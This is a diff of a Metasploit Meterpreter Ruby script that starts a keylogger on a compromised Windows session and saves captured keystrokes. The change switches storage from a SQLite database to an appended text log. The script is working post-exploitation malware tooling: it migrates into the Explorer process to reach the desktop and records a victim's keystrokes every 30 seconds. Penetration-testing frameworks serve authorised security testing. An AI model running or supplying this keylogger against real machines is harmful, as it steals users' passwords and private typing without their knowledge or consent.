@@ -1,9 +1,7 @@
 # $Id$
-require 'sqlite3'
-
 #
 # Meterpreter script for monitoring and capturing Keystrokes and
-# saving them in to  a sqlite db.
+# saving them in to  a file.
 # Provided by Carlos Perez at carlos_perez[at]darkoperator.com
 session = client
 # Script Options
@@ -15,7 +13,7 @@ session = client
 def usage
 	print_line("Keylogger Recorder Meterpreter Script")
 	print_line("This script will start the Meterpreter Keylogger and save all keys")
-	print_line("in a sqlite3 db for later anlysis. To stop capture hit Ctrl-C")
+	print_line("in a log file for later anlysis. To stop capture hit Ctrl-C")
 	print_line("Usage:" + @@exec_opts.usage)
 	raise Rex::Script::Completed
 end
@@ -34,7 +32,7 @@ logs = ::File.join(Msf::Config.config_directory, 'logs', 'keylogrecorder', host 
 ::FileUtils.mkdir_p(logs)
 
 #logfile name
-logfile = logs + ::File::Separator + host + filenameinfo + ".db"
+logfile = logs + ::File::Separator + host + filenameinfo + ".txt"
 
 #Interval for collecting Keystrokes in seconds
 keytime = 30
@@ -42,6 +40,14 @@ keytime = 30
 #Type of capture
 captype = 0
 
+# Function for writing results of other functions to a file
+def filewrt(file2wrt, data2wrt)
+        output = ::File.open(file2wrt, "a")
+        data2wrt.each_line do |d|
+                output.puts(d)
+        end
+        output.close
+end
 #Function to Migrate in to Explorer process to be able to interact with desktop
 def explrmigrate(session,captype)
 	begin
@@ -87,10 +93,7 @@ def keycap(session, keytime, logfile)
 	begin
 		rec = 1
 		#Creating DB for captured keystrokes
-		db = SQLite3::Database.new( logfile )
 		print_status("Keystrokes being saved in to #{logfile}")
-		#Creating table for captured keystrokes
-		db.execute("create table keystrokes (tkey INTEGER PRIMARY KEY,data TEXT,timeEnter DATE)")
 		#Inserting keystrokes every number of seconds specified
 		print("[*] Recording .")
 		while rec == 1
@@ -122,7 +125,7 @@ def keycap(session, keytime, logfile)
 				end
 			end
 			sleep(2)
-			db.execute( "insert into keystrokes (data,timeEnter) values (?,?)", outp,::Time.now.strftime("%Y%m%d.%M%S"))
+			filewrt(logfile,"#{outp}\n")
 			print(".")
 			sleep(keytime.to_i)
 		end
@@ -130,7 +133,6 @@ def keycap(session, keytime, logfile)
 	rescue::Exception => e
 		print("\n")
 		print_status("#{e.class} #{e}")
-		db.close
 		print_status("Stopping keystroke sniffer...")
 		session.ui.keyscan_stop
 	end
